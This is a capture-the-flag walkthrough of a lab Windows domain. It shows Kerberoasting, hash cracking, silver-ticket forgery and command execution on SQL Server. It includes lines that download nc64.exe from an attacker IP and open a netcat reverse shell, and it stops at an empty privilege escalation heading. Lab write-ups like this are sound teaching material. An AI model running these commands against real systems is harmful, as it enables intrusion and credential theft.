___
## Skills Covered

- Windows Domain Enumeration
- Kerberoasting
- Silver Ticket Attack
- Deserialisation Attack
- Source Code Review

___
## Enumeration

Begin by running an `nmap` scan of the IP address.
`sudo nmap -sV -p- -A 10.10.11.168`

This scan indicates that:
- Port 80 is hosting an IIS web server.
- Port 1433 is hosting  Microsoft SQL Server 2019
- The server is using Active Directory
- There is a confirmed domain name: `scrm.local`
- Port 4411 is hosting an unknown service.

It is worth adding the `scrm.local` domain name to the `hosts` file for convenience later on. This can be easily added using a simple one-liner:

`echo "10.10.11.168 scrm.local" | sudo tee -a /etc/hosts`

Port 4411 is an unknown (possibly custom) service. The service can be interacted with by connecting via `telnet`

`telnet scrm.local 4411`

The port responds with some text, and allows user input, responding with `Unknown command`.

```
Connected to scrm.local.
Escape character is '^]'.
SCRAMBLECORP_ORDERS_V1.0.3;
ls
ERROR_UNKNOWN_COMMAND;
help
ERROR_UNKNOWN_COMMAND;
```

At this point, there are no known commands for this prompt. Given that well known commands don't work, it is not worth wasting time trying to guess commands here yet.

The next obvious service to enumerate is the IIS web server hosted on port 80. The first step is to visit the web page:
`http://scrm.local`

The page advertises itself as the 'Scramble Corp intranet site', suggesting it could contain some valuable information. An alert of the 'IT Services' page explains that NTLM authentication is disabled on their network. This is useful to know as it means that Kerberos is the likely exploitation path, as opposed to NTLM.

Further enumeration of the pages on the domain lead to a 'Password Reset' page at `scrm.local/passwords.html`. The message on this page suggests that there may be some users whose passwords are the same as their username.

A screenshot on another page (`/supportrequest.html`) shows a command prompt window with an exposed username - `ksimpson`

## Enumerating FQDN and Authenticating with Kerberos
Based on the previous enumeration, it would be a good idea to attempt to authenticate as the user `ksimpson` with the password `ksimpson`. However, because NTLM is disabled on this network, the fully qualified domain name of the user is required to use Kerberos authentication. In order to gather this information, a tool called `ad-ldap-enum` from [CroweSecurity](https://github.com/CroweCybersecurity/ad-ldap-enum) can be used.

`python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson -v -s`

This script will create 4 `.tsv` files that are populated with various information about the domain, user, etc. The file that contains the FQDN that is required is the `Extended Domain Computer Information.tsv`. The file shows that the server name is `DC1`, and therefore the username and FQDN to authenticate as `ksimpson` is `ksimpson@DC1.scrm.local`. This can now be used with Kerberos.

To make it more convenient to work with the FQDN, run the following command to add it to the `hosts` file.

`echo "10.10.11.168 DC1.scrm.local" | sudo tee -a /etc/hosts`

The next step is to connect to SMB via Kerberos with the gathered credentials. This is possible using [Impacket](https://github.com/SecureAuthCorp/impacket)

`python3 smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local`

Running this command provides a SMB shell. The `shares` command will list available shares for the current user. By running `use [share_name]` on each share, and then using the `ls` command to list files in that share, it is clear that the only accessible share is the `Public` share. This share contains a file `Network Security Changes.pdf`. The file can be obtained by running `get Network Security Changes.pdf`.

Upon opening the PDF file, there are hints that there is an SQL database that contains valuable credentials but is restricted to admins only. There are also hints that a good next step would be to investigate Kerberos based attacks against the SQL service.

It is very likely the SQL service is running under a service account with a Service Principal Name (SPN). Therefore, it is a good next step to attempt a Kerberoasting attack using the `ksimpson` user to attempt to extract hashes for the SQL service account. This can be done using another [Impacket](https://github.com/SecureAuthCorp/impacket) tool:

```
python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request
```

Running this command provides a hash for the `sqlsvc` user, that can then be cracked with `john`. Add the hash to a file called `hash` and then run the following command:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Once `john` finishes, it will show that the password for the `sqlsvc` user is `Pegasus60`

Although these credentials do not directly provide any further access, they can be used in a Silver Ticket Attack to impersonate the Domain Admin on the SQL server.

## Gaining User Access

The next step is to perform the silver ticket attack. However, a few details are required before this attack can be performed

**NTLM Hash of Password**

A silver ticket attack requires an NTLM hash, which has not yet been gathered. Because the plain text password was gained from the dictionary attack earlier, an [online tool](https://codebeautify.org/ntlm-hash-generator) can be used to hash the plain text password with NTLM. The tool outputs the following NTLM hash:

`B999A16500B87D17EC7F2E2A68778F05`

**Security Identifier of the Domain (SID)**

A silver ticket attack also requires the SID. Whilst  `ldapsearch` can be used to gather the binary SID and use a python script to convert it to string form, it is unnecessarily complicated when there is access to Impacket tools. The Impacket tool `getPac.py` is used to gather the Privilege Attribute Certificate for any user, however it also prints the domain SID.

Use this Impacket command, targeting the `Adminstrator` user using the `ksimpson` credentials.

`python3 getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson`

`Domain SID: S-1-5-21-2743207045-1827831105-2542523200`

**Generating the ticket**

Now that all the required information has been gathered. The following command can be used to generate a silver ticket for the `Administrator` user that the SQL service will trust:

`python3 ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator

This will output a file `administrator.ccache` - This file is the Kerberos ticket for MSSQLSvc.

**Connecting to the SQL Database**

Now that a ticket has been generated that the SQL Server will trust, it is simple to connect to the SQL Database with another Impacket tool `mssqlclient.py`:

`KRB5CCNAME=administrator.ccache python3 mssqlclient.py -k dc1.scrm.local`

The obvious next step is to enumerate the SQL database and attempt to find the credentials that were mentioned in the PDF file earlier.

`select name, database_id from sys.databases;`

```
name                                                                                                                               database_id   
----
master                                                                                                                                       1   

tempdb                                                                                                                                       2   

model                                                                                                                                        3   

msdb                                                                                                                                         4   

ScrambleHR                                                                                                                                   5   
```

The `ScrambleHR` database clearly stands out here. It would be a good idea to check this first. List the tables in that database:

`select table_name from ScrambleHR.information_schema.tables;`
```
Employees                                                                                                                          
UserImport                                                                                                                         
Timesheets   
```

The `UserImport` database seems most likely to contain credentials, so it should be checked first:

`select * from ScrambleHR.dbo.UserImport;`
```
LdapUser   LdapPwd   LdapDomain   RefreshInterval   IncludeGroups      
---
MiscSvc   ScrambledEggs9900   scrm.local   90   0
---
```

This database contains the credentials for `MiscSvc`.

**Gaining a shell as MiscSvc**

Using the SQL service, run the command `enable_xp_cmdshell` to enable the SQL shell to issue commands to the server.

Then upload a PowerShell reverse shell generated from RevShells. The best option here is the Base64 shell.

```
xp_cmdshell powershell -e JABjAGwAaQBl....
```

Catch this shell using `nc -lvnp [port]`.

Now, host a python HTTP server and host a copy of `nc64.exe`, then run the following command to send a reverse shell as `MiscSvc`.

```
$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)

Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { curl http://10.10.14.6:8000/nc64.exe -o C:/Users/MiscSvc/nc64.exe }

Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:/Users/MiscSvc/nc64.exe 10.10.14.6 4444 -e cmd.exe }
```

*The user flag is located at `C:\Users\miscsvc\Desktop`*

## Privilege Escalation